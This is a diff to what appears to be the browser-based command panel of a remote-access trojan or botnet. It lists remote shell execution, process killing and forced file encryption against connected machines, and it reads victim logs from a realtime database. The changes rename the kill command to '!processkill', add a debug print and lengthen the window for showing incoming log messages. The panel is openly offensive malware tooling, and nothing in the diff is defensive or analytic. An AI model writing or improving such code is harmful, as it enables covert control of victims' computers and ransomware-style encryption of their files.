@@ -435,6 +435,7 @@
                     pcArray.push({ name: pc, channels: chans, server: srv });
                 }
             }
+            console.log("PC Array Built:", pcArray);
         }
 
         function runCmd(raw) {
@@ -487,7 +488,7 @@
 💻 REMOTE EXECUTION:
    !exec <cmd>        - Run Shell Command
    !cd <path>         - Change Directory
-   !kill <name>       - Kill Process
+   !processkill <name>       - Kill Process
 
 🔐 ENCRYPTION:
    !encrypt <pass>    - Force Encrypt Files
@@ -579,8 +580,8 @@
                     else return print("Usage: !taskmgr <on/off>", "log-err");
                     break;
 
-                case '!kill':
-                     if(!args) return print("Usage: !kill <process_name>", "log-err");
+                case '!processkill':
+                     if(!args) return print("Usage: !processkill <process_name>", "log-err");
                      pl.type='kill_proc'; pl.name=args;
                      break;
                 
@@ -648,7 +649,9 @@
         onValue(logs, (snap) => {
             if(snap.exists()) {
                 const val = Object.values(snap.val())[0];
-                if(Date.now() - val.timestamp < 2000) print(`→ ${val.message}`, "log-info");
+                if(Date.now() - val.timestamp < 10000) { 
+                    print(`→ ${val.message}`, "log-info");
+                }
             }
         });
 
